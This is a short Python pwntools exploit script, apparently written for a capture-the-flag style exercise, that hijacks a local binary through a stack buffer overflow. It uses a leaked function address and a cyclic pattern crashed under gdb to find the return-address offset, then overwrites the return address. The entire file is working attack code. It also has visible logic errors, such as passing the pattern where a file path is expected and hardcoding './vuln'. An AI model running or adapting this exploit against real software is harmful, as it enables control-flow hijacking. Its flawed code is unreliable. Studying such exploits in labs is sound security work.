from pwn import *
import subprocess
import re
import sys

def get_leaked_address(output):
    # Find leaked f() pointer in program output
    match = re.search(rb'Leaked f\(\) address: (0x[0-9a-fA-F]+)', output)
    if not match:
        log.error("Failed to find leaked address of f()")
    return int(match.group(1), 16)

def get_overwritten_return(vulnerable_executable):
    gdbscript = f"""
    set pagination off
    run
    x/gx $rsp
    quit
    """
    result = subprocess.check_output(
        ['gdb', '-q', vulnerable_executable],
        input=gdbscript.encode(),
        stderr=subprocess.DEVNULL
    )
    match = re.search(rb'0x([0-9a-fA-F]{8,16})', result)
    if not match:
        log.error("Failed to find return address")
    addr = int(match.group(0), 16)
    log.info(f"Overwritten return address: 0x{addr:x}")
    return p64(addr)

def find_offset_and_address(vulnerable_executable):
    pattern_len = 100
    
    log.info("Crashing binary with cyclic pattern to find offset...")
    pattern = cyclic(pattern_len)

    try:
        p = process(vulnerable_executable)
        leaked = p.recvline_contains(b"Leaked f() address:")
        f_addr = get_leaked_address(leaked)
        log.success(f"Leaked f() address: 0x{f_addr:x}")
        p.recvuntil(b"Enter input: ")
        p.sendline(pattern)
        p.wait()
    except Exception as e:
        log.warning(f"Process crash: {e}")
    
    overwritten = get_overwritten_return(pattern)
    found_offset = cyclic_find(overwritten)
    log.success(f"Found offset: {found_offset}")
    return found_offset,f_addr

def run_final_exploit(offset, f_address):
    log.info("Building final payload...")
    payload = b"A" * offset + p64(f_address)

    p = process("./vuln")
    p.recvuntil(b"Enter input: ")
    p.sendline(payload)
    print(p.recvall().decode())

# ---------- Main ----------
if len(sys.argv) == 1:
    print("Usage: python exploit.py <path_to_vulnerable_executable>")
    sys.exit(1)
vulnerable_executable = sys.argv[1]

run_final_exploit(*find_offset_and_address(vulnerable_executable))
